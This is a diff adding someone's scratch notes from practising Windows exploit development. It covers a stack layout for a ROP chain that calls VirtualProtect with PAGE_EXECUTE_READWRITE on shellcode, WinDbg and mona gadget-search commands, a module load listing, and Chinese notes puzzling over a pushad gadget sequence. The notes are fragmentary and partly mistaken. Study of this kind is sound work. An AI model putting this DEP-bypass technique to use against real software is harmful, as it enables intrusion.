@@ -1,0 +1,91 @@
+func(a, b);
+func2(c, d);
+
+d
+c
+&func2
+b
+a
+&ret
+&func
+
+
+
+BOOL VirtualProtect{ 
+    LPVOID lpAddress, 
+    DWORD dwsize, 
+    DWORD flNewProtect, 
+    PDWORD lpflOldProtect 
+}
+
+
+&shellcode
+codesize
+PAGE_EXECUTE_READWRITE
+&temp
+&shellcode
+&VirtualProtect
+
+...
+
+ret
+
+x /D /f KERNELBASE!VirtualProtect*
+
+https://github.com/corelan/windbglib
+
+.load pykd.pyd
+
+!py mona rop -m *.dll -cp nonull
+!py mona rop -m kernel32.dll,KERNELBASE.dll,ntdll.dll,MSVCR110.dll -cp nonull
+
+Stack
+19ee48
+
+Executable search path is: 
+ModLoad: 00400000 010b1000   experiment04.exe
+ModLoad: 77ac0000 77c64000   ntdll.dll
+ModLoad: 75b10000 75c00000   C:\WINDOWS\SysWOW64\KERNEL32.DLL
+ModLoad: 76d60000 76f7c000   C:\WINDOWS\SysWOW64\KERNELBASE.dll
+ModLoad: 76bc0000 76d5c000   C:\WINDOWS\SysWOW64\USER32.dll
+ModLoad: 75c00000 75c18000   C:\WINDOWS\SysWOW64\win32u.dll
+ModLoad: 76a30000 76a53000   C:\WINDOWS\SysWOW64\GDI32.dll
+ModLoad: 766c0000 767a0000   C:\WINDOWS\SysWOW64\gdi32full.dll
+ModLoad: 776b0000 7772b000   C:\WINDOWS\SysWOW64\msvcp_win.dll
+ModLoad: 76540000 76660000   C:\WINDOWS\SysWOW64\ucrtbase.dll
+ModLoad: 76f80000 7702f000   C:\WINDOWS\SysWOW64\COMDLG32.dll
+ModLoad: 77880000 7793f000   C:\WINDOWS\SysWOW64\msvcrt.dll
+ModLoad: 76260000 764e0000   C:\WINDOWS\SysWOW64\combase.dll
+ModLoad: 693e0000 693e6000   C:\WINDOWS\SysWOW64\MSIMG32.dll
+ModLoad: 77090000 7714e000   C:\WINDOWS\SysWOW64\RPCRT4.dll
+ModLoad: 76a70000 76af7000   C:\WINDOWS\SysWOW64\shcore.dll
+ModLoad: 779d0000 77a15000   C:\WINDOWS\SysWOW64\SHLWAPI.dll
+ModLoad: 75ca0000 76255000   C:\WINDOWS\SysWOW64\SHELL32.dll
+ModLoad: 710b0000 7113d000   C:\WINDOWS\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_5.82.19041.1110_none_c0da534e38c01f4d\COMCTL32.dll
+ModLoad: 75c20000 75c9b000   C:\WINDOWS\SysWOW64\ADVAPI32.dll
+ModLoad: 01690000 0170b000   C:\WINDOWS\SysWOW64\ADVAPI32.dll
+ModLoad: 76910000 76986000   C:\WINDOWS\SysWOW64\sechost.dll
+ModLoad: 69a20000 69a93000   C:\WINDOWS\SysWOW64\WINSPOOL.DRV
+ModLoad: 75a20000 75b03000   C:\WINDOWS\SysWOW64\ole32.dll
+ModLoad: 75980000 75a16000   C:\WINDOWS\SysWOW64\OLEAUT32.dll
+ModLoad: 72970000 729e4000   C:\WINDOWS\SysWOW64\UxTheme.dll
+ModLoad: 76b90000 76bb6000   C:\WINDOWS\SysWOW64\IMM32.dll
+ModLoad: 7aab0000 7aadc000   C:\WINDOWS\SysWOW64\oledlg.dll
+ModLoad: 70030000 70197000   C:\WINDOWS\WinSxS\x86_microsoft.windows.gdiplus_6595b64144ccf1df_1.1.19041.2251_none_d9513b1fe1046fc7\gdiplus.dll
+ModLoad: 688c0000 68913000   C:\WINDOWS\SysWOW64\OLEACC.dll
+ModLoad: 74540000 74568000   C:\WINDOWS\SysWOW64\WINMM.dll
+
+执行pushad，依次将EAX、ECX、EDX、EBX、ESP、EBP、ESI、EDI
+
+pushad 之后，首先是 edi
+edi 是 nop
+然后是 esi
+esi 是 jmp [eax]，执行 VirtualLock()
+Virtual 使用的参数是 esp 和 ebx
+函数执行完会回到 ebp
+
+不对啊 为什么执行 VirtualLock 啊，脑子有病吗
+
+KERNEL32!_imp__VirtualProtect
+=> 75b91368
+=> KERNEL32 + 0x81368
